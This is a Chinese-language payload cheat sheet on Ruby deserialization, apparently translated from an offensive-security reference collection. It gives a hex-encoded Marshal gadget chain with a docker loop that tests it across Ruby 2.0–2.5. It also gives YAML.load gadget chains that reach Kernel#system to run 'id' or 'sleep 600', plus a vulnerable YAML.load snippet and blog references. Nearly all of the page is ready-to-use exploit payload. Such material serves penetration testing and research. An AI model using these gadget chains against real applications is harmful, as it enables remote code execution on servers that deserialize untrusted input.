[原文文档](Ruby.en.md)

# Ruby 反序列化

> Ruby 反序列化是将序列化数据转换回 Ruby 对象的过程，通常使用 YAML、Marshal 或 JSON 等格式。例如，Ruby 的 Marshal 模块通常用于此目的，因为它可以序列化和反序列化复杂的 Ruby 对象。

## 摘要

* [Marshal 反序列化](#marshal-反序列化)
* [YAML 反序列化](#yaml-反序列化)
* [参考资料](#参考资料)

## Marshal 反序列化

用于生成和验证针对 Ruby 2.0 到 2.5 的反序列化小工具链的脚本

```ruby
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```

## YAML 反序列化

易受攻击的代码

```ruby
require "yaml"
YAML.load(File.read("p.yml"))
```

Ruby <= 2.7.2 的通用小工具：

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

Ruby 2.x - 3.x 的通用小工具。

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

```yaml
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
```

## 参考资料

* [Ruby 2.X 通用 RCE 反序列化小工具链 - Luke Jahnke - 2018 年 11 月 8 日](https://www.elttam.com.au/blog/ruby-deserialization/)
* [使用 Ruby YAML.load 的通用 RCE - Etienne Stalmans (@_staaldraad) - 2019 年 3 月 2 日](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
* [Ruby 2.x 通用 RCE 反序列化小工具链 - PentesterLab - 2024](https://pentesterlab.com/exercises/ruby_ugadget/course)
* [使用 Ruby YAML.load 的通用 RCE（版本 > 2.7）- Etienne Stalmans (@_staaldraad) - 2021 年 1 月 9 日](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)
* [通过 YAML 反序列化进行盲远程代码执行 - Colin McQueen - 2021 年 6 月 9 日](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)